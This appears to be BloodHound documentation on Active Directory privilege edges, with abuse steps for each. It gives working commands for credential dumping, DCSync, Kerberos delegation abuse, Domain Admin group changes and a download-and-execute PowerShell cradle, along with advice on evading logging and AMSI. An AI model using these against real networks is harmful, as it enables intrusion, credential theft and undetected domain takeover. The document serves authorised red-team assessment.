Edges
=====

Words about edges

AdminTo
^^^^^^^

This edge indicates that principal is a local administrator on the target
computer. By default, administrators have several ways to perform remote
code execution on Windows systems, including via RDP, WMI, WinRM, the
Service Control Manager, and remote DCOM execution.

Further, administrators have several options for impersonating other users
logged onto the system, including plaintext password extraction, token
impersonation, and injecting into processes running as another user.

Finally, administrators can often disable host-based security controls that
would otherwise prevent the aforementioned techniques.

Abuse Info
----------

There are several ways to pivot to a Windows system. If using Cobalt
Strike's beacon, check the help info for the commands "psexec", "psexec_psh",
"wmi", and "winrm". With Empire, consider the modules for Invoke-PsExec,
Invoke-DCOM, and Invoke-SMBExec.

With Metasploit, consider the modules "exploit/windows/smb/psexec",
"exploit/windows/winrm/winrm_script_exec", and
"exploit/windows/local/ps_wmi_exec".

Additionally, there are several manual methods for remotely executing code on
the machine, including via RDP, with the service control binary and
interaction with the remote machine's service control manager, and remotely
instantiating DCOM objects. For more information about these lateral movement
techniques, see the References section below.

**Gathering credentials**

The most well-known tool for gathering credentials from a Windows system is
mimikatz. mimikatz is built into several agents and toolsets, including
Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high
integrity process with SeDebugPrivilege, execute one or more of mimikatz's
credential gathering techniques (e.g.: sekurlsa::wdigest,
sekurlsa::logonpasswords, etc.), then parse or investigate the output to
find clear-text credentials for other users logged onto the system.
            
You may also gather credentials when a user types them or copies them to
their clipboard! Several keylogging capabilities exist, several agents and
toolsets have them built-in. For instance, you may use meterpreter's
"keyscan_start" command to start keylogging a user, then "keyscan_dump" to
return the captured keystrokes. Or, you may use PowerSploit's
Invoke-ClipboardMonitor to periodically gather the contents of the user's
clipboard.

**Token Impersonation**

You may run into a situation where a user is logged onto the system, but
you can't gather that user's credential. This may be caused by a host-based
security product, lsass protection, etc. In those circumstances, you may
abuse Windows' token model in several ways. First, you may inject your agent
into that user's process, which will give you a process token as that user,
which you can then use to authenticate to other systems on the network. Or,
you may steal a process token from a remote process and start a thread in
your agent's process with that user's token. For more information about
token abuses, see the References tab.

**Disabling host-based security controls**

Several host-based controls may affect your ability to execute certain
techniques, such as credential theft, process injection, command line
execution, and writing files to disk. Administrators can often disable these
host-based controls in various ways, such as stopping or otherwise disabling
a service, unloading a driver, or making registry key changes. For more
information, see the References section below.

Opsec Considerations
--------------------

There are several forensic artifacts generated by the techniques described
above. For instance, lateral movement via PsExec will generate 4697 events on
the target system. If the target organization is collecting and analyzing those
events, they may very easily detect lateral movement via PsExec. 

Additionally, an EDR product may detect your attempt to inject into lsass and
alert a SOC analyst. There are many more opsec considerations to keep in mind
when abusing administrator privileges. For more information, see the References
section below.

References
----------

https://attack.mitre.org/wiki/Lateral_Movement

**Gathering Credentials**

* http://blog.gentilkiwi.com/mimikatz
* https://github.com/gentilkiwi/mimikatz
* https://adsecurity.org/?page_id=1821
* https://attack.mitre.org/wiki/Credential_Access

**Token Impersonation**

* https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf
* https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
* https://attack.mitre.org/wiki/Technique/T1134

**Disabling host-based security controls**

* https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/
* https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/

**Opsec Considerations**

* https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/

MemberOf
^^^^^^^^

Groups in active directory grant their members any privileges the group itself
has. If a group has rights to another principal, users/computers in the group,
as well as other groups inside the group inherit those permissions.

Abuse Info
----------

No abuse is necessary. This edge simply indicates that a principal belongs to a
security group.

Opsec Considerations
--------------------

No opsec considerations apply to this edge.

References
----------

* https://adsecurity.org/?tag=ad-delegation
* https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions

HasSession
^^^^^^^^^^

When a user authenticates to a computer, they often leave credentials exposed on
the system, which can be retrieved through LSASS injection, token manipulation
or theft, or injecting into a user's process.

Any user that is an administrator to the system has the capability to retrieve
the credential material from memory if it still exists.

.. note:: A session does not guarantee credential material is present, only possible.

This video explains exactly how BloodHound's session data collection method works:

.. raw:: html

    <div style="text-align: center; margin-bottom: 2em;">
    <iframe width="100%" height="350" src="https://www.youtube.com/embed/q86VgM2Tafc?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

Abuse Info
----------

When a user has a session on the computer, you may be able to obtain credentials for
the user via credential dumping or token impersonation. You must be able to move
laterally to the computer, have administrative access on the computer, and the user
must have a non-network logon session on the computer.

Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on
the target, you can use mimikatz to dump credentials of the user that has a session
on the computer. While running in a high integrity process with SeDebugPrivilege,
execute one or more of mimikatz's credential gathering techniques (e.g.:
sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the
output to find clear-text credentials for other users logged onto the system.

You may also gather credentials when a user types them or copies them to their
clipboard! Several keylogging capabilities exist, several agents and toolsets have
them built-in. For instance, you may use meterpreter's "keyscan_start" command to
start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or,
you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents
of the user's clipboard.

**Token Impersonation**

You may run into a situation where a user is logged onto the system, but you can't
gather that user's credential. This may be caused by a host-based security product,
lsass protection, etc. In those circumstances, you may abuse Windows' token model in
several ways. First, you may inject your agent into that user's process, which will
give you a process token as that user, which you can then use to authenticate to other
systems on the network. Or, you may steal a process token from a remote process and
start a thread in your agent's process with that user's token. For more information
about token abuses, see the References section below.

User sessions can be short lived and only represent the sessions that were present at
the time of collection. A user may have ended their session by the time you move to
the computer to target them. However, users tend to use the same machines, such as the
workstations or servers they are assigned to use for their job duties, so it can be
valuable to check multiple times if a user session has started.

Opsec Considerations
--------------------

An EDR product may detect your attempt to inject into lsass and alert a SOC analyst.
There are many more opsec considerations to keep in mind when stealing credentials or
tokens. For more information, see the References section.

References
----------

* http://blog.gentilkiwi.com/mimikatz
* https://github.com/gentilkiwi/mimikatz
* https://adsecurity.org/?page_id=1821
* https://attack.mitre.org/wiki/Credential_Access

**Token Impersonation**

* https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf
* https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
* https://attack.mitre.org/wiki/Technique/T1134

ForceChangePassword
^^^^^^^^^^^^^^^^^^^

This edge indicates that the principal can reset the password of the target user without
knowing the current password of that user.

To see an example of this edge being abused, see this clip from Derbycon 2017:

.. raw:: html

    <div style="text-align: center; margin-bottom: 2em;">
    <iframe width="100%" height="350" src="https://www.youtube.com/embed/z8thoG7gPd0?t=2291?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

Abuse Info
----------

There are at least two ways to execute this attack. The first and most obvious is by
using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain).
See the opsec considerations section for why this may be a bad idea. The second, and
highly recommended method, is by using the Set-DomainUserPassword function in PowerView.
This function is superior to using the net.exe binary in several ways. For instance, you
can supply alternate credentials, instead of needing to run a process as or logon as the
user with the ForceChangePassword privilege. Additionally, you have much safer execution
options than you do with spawning net.exe (see the opsec info below).

To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView
into your agent session or into a PowerShell instance at the console. You may need to
authenticate to the Domain Controller as the user with the password reset privilege if
you are not running a process as that user.

To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object
(these examples comes from the PowerView help documentation):

::

  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)

Then create a secure string object for the password you want to set on the target user:

::

  $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already
running within a process as the user with the password reset privilege

::

  Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred

Now that you know the target user's plain text password, you can either start a new agent
as that user, or use that user's credentials in conjunction with PowerView's ACL abuse
functions, or perhaps even RDP to a system the target user has access to. For more ideas
and information, see the references section below.

Opsec Considerations
--------------------

Executing this abuse with the net binary will necessarily require command line execution.
If your target organization has command line logging enabled, this is a detection
opportunity for their analysts. 

Regardless of what execution procedure you use, this action will generate a 4724 event on
the domain controller that handled the request. This event may be centrally collected and
analyzed by security analysts, especially for users that are obviously very high
privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced
several key security features such as script block logging and AMSI that provide security
analysts another detection opportunity. You may be able to completely evade those features
by downgrading to PowerShell v2. 

Finally, by changing a service account password, you may cause that service to stop
functioning properly. This can be bad not only from an opsec perspective, but also a client
management perspective. Be careful!

References
----------

* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
* https://www.youtube.com/watch?v=z8thoG7gPd0
* https://www.sixdub.net/?p=579
* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724

AddMembers
^^^^^^^^^^

This edge indicates the principal has the ability to add arbitrary principlas to the target
security group. Because of security group delegation, the members of a security group have
the same privileges as that group.

By adding yourself to a group and refreshing your token, you gain all the same privileges
that group has.

Abuse Info
----------

There are at least two ways to execute this attack. The first and most obvious is by using
the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add
/domain). See the opsec considerations tab for why this may be a bad idea. The second, and
highly recommended method, is by using the Add-DomainGroupMember function in PowerView.
This function is superior to using the net.exe binary in several ways. For instance, you
can supply alternate credentials, instead of needing to run a process as or logon as the
user with the AddMember privilege. Additionally, you have much safer execution options than
you do with spawning net.exe (see the opsec tab).

To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into
your agent session or into a PowerShell instance at the console. 

You may need to authenticate to the Domain Controller as the user with the AddMembers right
if you are not running a process as that user. To do this in conjunction with
Add-DomainGroupMember, first create a PSCredential object (these examples comes from the
PowerView help documentation):

::

  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running
within a process owned by the user with the AddMembers privilege

::

  Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

::

  Get-DomainGroupMember -Identity 'Domain Admins'

Opsec Considerations
--------------------

Executing this abuse with the net binary will require command line execution. If your target
organization has command line logging enabled, this is a detection opportunity for their
analysts.

Regardless of what execution procedure you use, this action will generate a 4728 event on the
domain controller that handled the request. This event may be centrally collected and analyzed
by security analysts, especially for groups that are obviously very high privilege groups
(i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security
features such as script block logging and AMSI that provide security analysts another detection
opportunity. 

You may be able to completely evade those features by downgrading to PowerShell v2.

References
----------

* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
* https://www.youtube.com/watch?v=z8thoG7gPd0
* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728

CanRDP
^^^^^^

Remote Desktop access allows you to enter an interactive session with the target computer. If
authenticating as a low privilege user, a privilege escalation may allow you to gain high
privileges on the system.
    
..note:: This edge does not guarantee privileged execution.

AbuseInfo
---------

Abuse of this privilege will depend heavily on the type of access you have. 
            
**PlainText Credentials with Interactive Access**

With plaintext credentials, the easiest way to exploit this privilege is using the built-in
Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the target computer name.
When prompted for credentials, input the credentials for the user with RDP rights to initiate
the remote desktop connection.

**Password Hash with Interactive Access**

With a password hash, exploitation of this privilege will require local administrator privileges
on a system, and the remote server must allow Restricted Admin Mode. 

First, inject the NTLM credential for the user you're abusing into memory using mimikatz:

::

  lsadump::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:"mstsc.exe /restrictedadmin"

This will open a new RDP window. Input the target computer name to initiate the remote desktop
connection. If the target server does not support Restricted Admin Mode, the session will fail.

**Plaintext Credentials without Interactive Access**

This method will require some method of proxying traffic into the network, such as the socks command
in Cobalt Strike, or direct internet connection to the target network, as well as the xfreerdp
(suggested because of support of Network Level Authentication (NLA)) tool, which can be installed
from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate
the remote desktop connection with the following command:

::

  proxychains xfreerdp /u:dfm /d:testlab.local /v:<computer ip>

xfreerdp will prompt you for a password, and then initiate the remote desktop connection.

**Password Hash without Interactive Access**

This method will require some method of proxying traffic into the network, such as the socks command
in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp
(suggested because of support of Network Level Authentication (NLA)) tool, which can be installed
from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If
using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection
with the following command:

::

  proxychains xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>

This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not
enabled.

Opsec Considerations
--------------------

If the target computer is a workstation and a user is currently logged on, one of two things will
happen. If the user you are abusing is the same user as the one logged on, you will effectively take
over their session and kick the logged on user off, resulting in a message to the user. If the users
are different, you will be prompted to kick the currently logged on user off the system and log on.
If the target computer is a server, you will be able to initiate the connection without issue
provided the user you are abusing is not currently logged in.

Remote desktop will create Logon and Logoff events with the access type RemoteInteractive.

References
----------

* https://michael-eder.net/post/2018/native_rdp_pass_the_hash/
* https://www.kali.org/penetration-testing/passing-hash-remote-desktop/

CanPSRemote
^^^^^^^^^^^

PS Session access allows you to enter an interactive session with the target computer. If
authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges
on the system.
    
..note:: This edge does not guarantee privileged execution.

AbuseInfo
---------

Abuse of this privilege will require you to have interactive access with a system on the network.
    
A remote session can be opened using the New-PSSession powershell command.

You may need to authenticate to the Domain Controller as the user with the PSRemote rights on the
target computer if you are not running as that user. To do this in conjunction with New-PSSession,
first create a PSCredential object (these examples comes from the PowerView help documentation):

::

  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)

Then use the New-PSSession command with the credential we just created:

::

  $session = New-PSSession -ComputerName <target computer name> -Credential $Cred

This will open a PowerShell session on the target computer

You can then run a command on the system using the Invoke-Command cmdlet and the session you just
created

::

  Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}

Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.

::

  Disconnect-PSSession -Session $session
  Remove-PSSession -Session $session

An example of running through this Cobalt Strike for lateral movement is as follows:

::

  powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session
  -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))};
  Disconnect-PSSession -Session $session; Remove-PSSession -Session $session

Opsec Considerations
--------------------

When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security
mechanisms that make it much easier for defenders to see what's going on with PowerShell in their
network, such as script block logging and AMSI.

Entering a PSSession will generate a logon event on the target computer.

References
----------

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7

ExecuteDCOM
^^^^^^^^^^^

This can allow code execution under certain conditions by instantiating a COM object on a remote
machine and invoking its methods.

AbuseInfo
---------

The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM
objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and
ExcelDDE).  LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).  

One can manually instantiate and manipulate COM objects on a remote machine using the following
PowerShell code.  If specifying a COM object by its CLSID:

:: 

  $ComputerName = <target computer name>              # Remote computer
  $clsid = “{fbae34e8-bf95-4da8-bf98-6c6e580aa348}”   # GUID of the COM object
  $Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
  $ComObject = [Activator]::CreateInstance($Type)

If specifying a COM object by its ProgID:

::

  $ComputerName = <target computer name>              # Remote computer
  $ProgId = “<NAME>”                                  # GUID of the COM object
  $Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
  $ComObject = [Activator]::CreateInstance($Type)

Opsec Considerations
--------------------

The artifacts generated when using DCOM vary depending on the specific COM object used.

DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may
leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must
be authenticated.  Consequently, logon events and authentication-specific logs(Kerberos, NTLM,
etc.) will be generated when using DCOM.  

Processes may be spawned as the user authenticating to the remote system, as a user already
logged into the system, or may take advantage of an already spawned process.  

Many DCOM servers spawn under the process “svchost.exe -k DcomLaunch” and typically have a
command line containing the string “ -Embedding” or are executing inside of the DLL hosting
process “DllHost.exe /Processid:{<AppId>}“ (where AppId is the AppId the COM object is
registered to use).  Certain COM services are implemented as service executables; consequently,
service-related event logs may be generated.

References
----------

* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
* https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
* https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
* https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
* https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
* https://www.cybereason.com/blog/dcom-lateral-movement-techniques
* https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/
* https://attack.mitre.org/wiki/Technique/T1175

**Invoke-DCOM**

* https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
            
**LethalHTA**

* https://codewhitesec.blogspot.com/2018/07/lethalhta.html
* https://github.com/codewhitesec/LethalHTA/

SQLAdmin
^^^^^^^^

The user is a SQL admin on the target computer

There is at least one MSSQL instance running on the computer where the user with the inbound
SQLAdmin edge is the account configured to run the SQL Server instance. The typical configuration
for MSSQL is to have the local Windows account or Active Directory domain account that is
configured to run the SQL Server service (the primary database engine for SQL Server) have
sysadmin privileges in the SQL Server application. As a result, the SQL Server service account
can be used to log into the SQL Server instance remotely, read all of the databases (including
those protected with transparent encryption), and run operating systems command through SQL
Server (as the service account) using a variety of techniques.

For Windows systems that have been joined to an Active Directory domain, the SQL Server instances
and the associated service account can be identified by executing a LDAP query for a list of
"MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine
service starts, it attempts to register the SPN, and the SPN is then used to help facilitate
Kerberos authentication.

Author: Scott Sutherland

AbuseInfo
---------

Scott Sutherland from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL
Server. Major contributors include Antti Rantasaari, Eric Gruber, and Thomas Elling. Before
executing any of the below commands, download PowerUpSQL and laod it into your PowerShell
instance. Get PowerUpSQL here: https://github.com/NetSPI/PowerUpSQL

**Finding Data**

Get a list of databases, sizes, and encryption status:

::

  Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\instance –Threads 10 -NoDefaults

Search columns and data for keywords:

::

  Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\instance –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize

**Executing Commands**

Below are examples of PowerUpSQL functions that can be used to execute operating system
commands on remote systems through SQL Server using different techniques.  The level of
access on the operating system will depend largely what privileges are provided to the
service account.  However, when domain accounts are configured to run SQL Server services,
it is very common to see them configured with local administrator privileges.

xp_cmdshell Execute Example:

::

  Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\instance

Agent Job Execution Examples:

::


  Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt" -Instance sqlserver\instance -username myuser -password mypassword

::

  Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20 -Instance sqlserver\instance -username myuser -password mypassword

::

  Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword

::

  Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword

Python Subsystem Execution:

::

  Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\instance

R subsystem Execution Example:

::

  Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\instance

OLE Execution Example:

::

  Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\instance

CLR Execution Example:

::

  Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\instance

Custom Extended Procedure Execution Example:

1. Create a custom extended stored procedure:

::

  Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

2. Host the test.dll on a share readable by the SQL Server service account:

::

  Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'" -Instance sqlserver\instance

3. Run extended stored procedure:

::

  Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance

4. Remove extended stored procedure:

::

  Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\instance

Author: Scott Sutherland

Opsec Considerations
--------------------

Prior to executing operating system commands through SQL Server, review the audit configuration
and choose a command execution method that is not being monitored.
            
View audits:

::

  SELECT * FROM sys.dm_server_audit_status

View server specifications:

::

  SELECT audit_id, 
  a.name as audit_name, 
  s.name as server_specification_name, 
  d.audit_action_name, 
  s.is_state_enabled, 
  d.is_group, 
  d.audit_action_id, 
  s.create_date, 
  s.modify_date 
  FROM sys.server_audits AS a 
  JOIN sys.server_audit_specifications AS s 
  ON a.audit_guid = s.audit_guid 
  JOIN sys.server_audit_specification_details AS d 
  ON s.server_specification_id = d.server_specification_id

View database specifications:

::

  SELECT a.audit_id, 
  a.name as audit_name, 
  s.name as database_specification_name, 
  d.audit_action_name, 
  d.major_id,
  OBJECT_NAME(d.major_id) as object,
  s.is_state_enabled, 
  d.is_group, s.create_date, 
  s.modify_date, 
  d.audited_result 
  FROM sys.server_audits AS a 
  JOIN sys.database_audit_specifications AS s 
  ON a.audit_guid = s.audit_guid 
  JOIN sys.database_audit_specification_details AS d 
  ON s.database_specification_id = d.database_specification_id

If server audit specifications are configured on the SQL Server, event ID 15457 logs may be
created in the Windows Application log when SQL Server level configurations are changed to
facilitate OS command execution.

If database audit specifications are configured on the SQL Server, event ID 33205 logs may
be created in the Windows Application log when Agent and database level configuration changes
are made.

A summary of the what will show up in the logs, along with the TSQL queries for viewing and
configuring audit configurations can be found at https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql

Author: Scott Sutherland

References
----------

* https://github.com/NetSPI/PowerUpSQL/wiki</a>
* https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation
* https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver
* https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017
* https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/

AllowedToDelegate
^^^^^^^^^^^^^^^^^

The constrained delegation primitive allows a principal to authenticate as any user to specific
services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the
target computer. That is, a node with this privilege can impersonate any domain principal
(including Domain Admins) to the specific service on the target host. One caveat- impersonated
users can not be in the "Protected Users" security group or otherwise have delegation privileges
revoked.
            
An issue exists in the constrained delegation where the service name (sname) of the resulting
ticket is not a part of the protected ticket information, meaning that an attacker can modify
the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo
is “HTTP/host.domain.com”, tickets can be modified for LDAP/HOST/etc. service names, resulting
in complete server compromise, regardless of the specific service listed.

AbuseInfo
---------

Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated
from the Impacket library, or using the Rubeus project's s4u abuse.

In the following example, *victim* is the attacker-controlled account (i.e. the hash is known)
that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local"
service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests
a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin"
user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the
final service ticket and the ticket is submitted to the current logon session. This grants the attacker
the ability to access the file system of PRIMARY.testlab.local as the "admin" user.

::

  Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt

Opsec Considerations
--------------------

As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs
to be executed on some system with the ability to send/receive traffic in the domain. See the References
for more information.

References
----------

* https://github.com/GhostPack/Rubeus#s4u</a>
* https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a>
* http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>
* https://twitter.com/gentilkiwi/status/806643377278173185</a>
* https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a>
* http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</a>
* http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/

GetChanges/GetChangesAll
^^^^^^^^^^^^^^^^^^^^^^^^

The combination of both these privileges grants a principal the ability to perform the DCSync attack.

AbuseInfo
---------

With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to
get the password hash of an arbitrary principal using mimikatz:
            
::

  lsadump::dcsync /domain:testlab.local /user:Administrator

You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on
this see the blog post by harmj0y in the references tab.

Opsec Considerations
--------------------

For detailed information on detection of DCSync as well as opsec considerations, see the ADSecurity
post in the references section below.

References
----------

* https://adsecurity.org/?p=1729
* http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

GenericAll
^^^^^^^^^^

This is also known as full control. This privilege allows the trustee to manipulate the target object
however they wish.

AbuseInfo
---------

**With GenericAll Over a Group:**

Full control of a group allows you to directly modify group membership of the group. For full abuse
info in that scenario, see the AbuseInfo section under the AddMembers edge

**With GenericAll Over a User:**

**Targeted Kerberoast**
A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with
Get-DomainSPNTicket. 

You may need to authenticate to the Domain Controller as the user with full control over the target
user if you are not running a process as that user. To do this in conjunction with Set-DomainObject,
first create a PSCredential object (these examples comes from the PowerView help documentation):

::

  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as
the user with full control over the target user.

::

  Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

After running this, you can use Get-DomainSPNTicket as follows:
    
::

  Get-DomainSPNTicket -Credential $Cred harmj0y | fl

The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName
can be done with the Set-DomainObject command:

::

  Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname

**Force Change Password**

You can also reset user passwords with full control over user objects. For full abuse info about this attack,
see the information under the ForceChangePassword edge

**With GenericAll Over a Computer**

Full control of a computer object is abusable when the computer’s local admin account credential is
controlled with LAPS. The clear-text password for the local administrator account is stored in an extended
attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may
have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying
the computer object’s security descriptor.
    
Alternatively, Full control of a computer object can be used to perform a resource based constrained
delegation attack. 

Abusing this primitive is currently only possible through the Rubeus project.

First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can
be used to add a new attacker-controlled computer account:

::

  New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

::

  $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the
binary bytes for the new DACL/ACE:

::

  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
  $SDBytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDBytes, 0)

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity
field of the comptuer account we're taking over, again using PowerView in this case:

::

  Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:

::

  Rubeus.exe hash /password:Summer2018!

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we
want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants
us access to the file system of the TARGETCOMPUTER:

::

  Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt

